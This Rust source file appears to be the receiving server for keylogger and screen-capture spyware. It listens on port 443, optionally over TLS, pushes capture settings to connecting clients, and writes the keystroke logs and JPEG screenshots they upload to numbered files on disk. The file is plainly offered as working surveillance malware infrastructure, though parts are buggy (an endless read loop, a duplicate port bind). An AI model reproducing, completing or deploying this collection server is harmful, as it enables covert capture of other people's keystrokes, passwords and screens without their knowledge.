use std::net::{UdpSocket, TcpListener, TcpStream};
use openssl::ssl::{SslMethod, SslAcceptor, SslStream, SslFiletype};
use std::sync::Arc;
use std::convert::TryInto;
use std::fs::File;
use std::io::{Read, Write};
use std::sync::mpsc::channel;
use crate::pool::Pool;
const THREADS_MAX: usize = 12;

const LOCAL_DOMAIN: &str = "revy.johnroark.us";
const SIGNAL_SIZE: usize = 4;
const LOCAL_PORT: i32 = 443;
const SYN_SIZE: usize = 8;

enum FileType {Keys, Screens}
enum ClientState { UnInit, Ready, Dead }
pub enum SocketType { TLSEncap((String, String)), NoTls } // will selfsigned work?
pub enum CompressionQuality { Best, Good, Default, Low }
impl CompressionQuality {
    fn value(&self) -> i32 {
        match *self {
            CompressionQuality::Best => 60,
            CompressionQuality::Good => 55,
            CompressionQuality::Default => 50,
            CompressionQuality::Low => 45
        }
    }
}

pub struct ServerConfig {
    pub socket_type: Option<SocketType>,
    pub pool_size: Option<usize>,
    pub frame_time: Option<i32>,
    pub compression_quality: Option<CompressionQuality>
}

pub struct TCPSocketServer {
    addr: String,
    listener: TcpListener,
    pool: Pool,
    acceptor: Option<Arc<SslAcceptor>>,
    config: ServerConfig,
    is_ssl: bool,
    // I would like to add some client differentiation here
    // maybe bind it to their IP? that way we can track different clients?
    // or perhaps make it some sort of ID based thing
    // that'd need to be shared across threads though
}

enum TCPSignalServer {
    ServerSynAck = 1,
    ReadKeysAck,
    ReadScreenAck,
    ReadMetaAck,
    Continue,
    Unknown
}

impl TCPSocketServer {
    // we don't need two types for the server because the underlying socket is the same
    // only needs an optional acceptor for accepting TLS streams
    pub fn init(config: ServerConfig) -> TCPSocketServer {
        let pool = {
            match config.pool_size {
                Some(s) => Pool::new(s),
                None => Pool::new(THREADS_MAX)
            }
        };
        let mut addr = {
            match try_get_default_addr() {
                Some(s) => s,
                None => unimplemented!()
            }
        };
        addr = format!("{}:{}", addr, LOCAL_PORT);
        let acceptor = match config.socket_type {
            Some(ref socket_type) => {
                match socket_type {
                    SocketType::TLSEncap((key, cert)) => {
                        let _listener = TcpListener::bind(&addr).unwrap();
                        let mut acceptor = SslAcceptor::mozilla_intermediate(
                            SslMethod::tls()
                        ).unwrap();
                        acceptor.set_private_key_file(&key, SslFiletype::PEM).unwrap();
                        acceptor.set_certificate_chain_file(&cert).unwrap();
                        acceptor.check_private_key().unwrap();
                        Some(Arc::new(acceptor.build()))
                    },
                    SocketType::NoTls => { None }
                }
            },
            None => { None }
        };
        let listener = TcpListener::bind(&addr).unwrap(); 
        let is_ssl: bool = { if acceptor.is_some() {true} else {false}};
        return TCPSocketServer {
            addr: addr,
            pool: pool,
            listener: listener,
            acceptor: acceptor,
            config: config,
            is_ssl: is_ssl
        }
    }

    pub fn keep_alive(&mut self) {
        let mut i = 1i128;
        match self.is_ssl {
            true => {
                loop { self.run_ssl(i); }
            },
            false => {
                loop { self.run_nossl(i); }
            }
        }
    }

    fn run_ssl(&mut self, i: i128) {
        let mut i = 1i128;
        for mut stream in self.listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let acceptor = self.acceptor.as_ref().unwrap().clone();
                    let mut stream_threaded = stream.try_clone().unwrap();
                    let (tx, rx) = channel();
                    self.pool.execute(move || {
                        let mut encap = acceptor.accept(stream_threaded).unwrap();
                        tx.send(
                            match handle_stream(&mut encap, i) {
                                StreamState::Continue => false,
                                StreamState::RequiresInit => true, 
                                StreamState::Stopped => false
                            }
                        ).unwrap();
                    }); 
                    match rx.recv().unwrap() {
                        true => { self.init_client(&mut stream); },
                        false => { }
                    };
                    i = i + 1;
                }
                Err(_) => { /* connection failed */ }
            }
        }
    }

    fn run_nossl(&mut self, i: i128) {
        for mut stream in self.listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let (tx, rx) = channel();
                    let mut str_handle_init = stream.try_clone().unwrap();
                    self.pool.execute(move || {
                        tx.send(
                            match handle_stream(&mut str_handle_init, i) {
                                StreamState::Continue => false,
                                StreamState::RequiresInit => true, 
                                StreamState::Stopped => false
                            }
                        ).unwrap();
                    }); 
                    match rx.recv().unwrap() {
                        true => {
                            match self.init_client(&mut stream) {
                                ClientState::UnInit | ClientState::Dead => {},
                                ClientState::Ready => {
                                    // have a worker to deal with this guy
                                    let mut str_handle = stream.try_clone().unwrap();
                                    self.pool.execute(move || {
                                        let i = i.clone();
                                        loop { match handle_stream(&mut str_handle, i) {
                                            StreamState::Continue => {}, 
                                            _ => break
                                        }}
                                    });
                                }
                            }
                        },
                        false => { }
                    };
                }
                Err(_) => { /* connection failed */ }
            }
        }
    }

    fn init_client<T>(&self, stream: &mut T) -> ClientState 
    where T: Read + Write
    {
        let mut res = Vec::new();
        res.extend(
            &self.config
                .frame_time
                .unwrap_or(1000i32)
                .to_be_bytes()
        );
        let compression: i32 = { match &self.config.compression_quality {
            Some(comp) => comp.value(),
            None => 44i32
        }};
        res.extend(&compression.to_be_bytes());
        stream.write(&res).unwrap();
        let mut sig_arr = [0u8; SIGNAL_SIZE];
        stream.read(&mut sig_arr).unwrap();
        match i32::from_be_bytes(sig_arr) {
            1 => ClientState::UnInit,
            2 => ClientState::Ready,
            _ => ClientState::Dead
        }
    }

}

fn run_complete_file<T>(idx: i128, file_type: FileType, stream: &mut T)
    where T: Read + Write
{
    let mut file = {
        match file_type {
            FileType::Keys => {
                println!("Saving keys");
                File::create(
                    format!("keystrokes_{:?}.txt", idx)
                ).unwrap()
            },
            FileType::Screens => {
                println!("Saving screenshot");
                File::create(
                    format!("screenshot_{:?}.jpg", idx)
                ).unwrap()
            }
        }
    };
    let mut buffer = Vec::with_capacity(100000);
    stream.read(&mut vec![]).unwrap();
    loop {
        let n = stream.read_to_end(&mut buffer).unwrap();
        if n != 0 {
            print!("{:?}", n);
            match file_type {
                FileType::Keys => 
                    { 
                        file.write(
                            &std::str::from_utf8(&buffer)
                                .unwrap()
                                .as_bytes()
                        ).unwrap();
                    },
                FileType::Screens => { file.write(&buffer).unwrap(); }
            }
        }
        //else { println!("Done!"); break }
    }
}

enum StreamState { RequiresInit, Continue, Stopped }
fn handle_stream<T>(stream: &mut T, i: i128) -> StreamState
    where T: Read + Write 
{
    let mut in_buf = [0u8; SIGNAL_SIZE];
    stream.read(&mut in_buf).unwrap();
    match i32::from_be_bytes(in_buf) {
        1 => { println!("initializing client"); StreamState::RequiresInit },
        4 => { println!("client stopping"); StreamState::Stopped },
        5 => { // StartSendKeys
            println!("writing client keys!");
            stream.write(&5i32.to_be_bytes()).unwrap();
            run_complete_file(i, FileType::Keys, stream);
            StreamState::Continue
        },
        6 => { // StartSendScreens
            println!("writing client screenshot!");
            stream.write(&6i32.to_be_bytes()).unwrap();
            run_complete_file(i, FileType::Screens, stream);
            StreamState::Continue
        },
        _ => { StreamState::Continue }
    }
}

fn try_get_default_addr() -> Option<String> {
	let socket = match UdpSocket::bind("0.0.0.0:0") {
		Ok(s) => s,
		Err(_) => return None,
	};

	match socket.connect("8.8.8.8:80") {
		Ok(()) => (),
		Err(_) => return None,
	};

	match socket.local_addr() {
		Ok(addr) => return Some(addr.ip().to_string()),
		Err(_) => return None,
	};
}
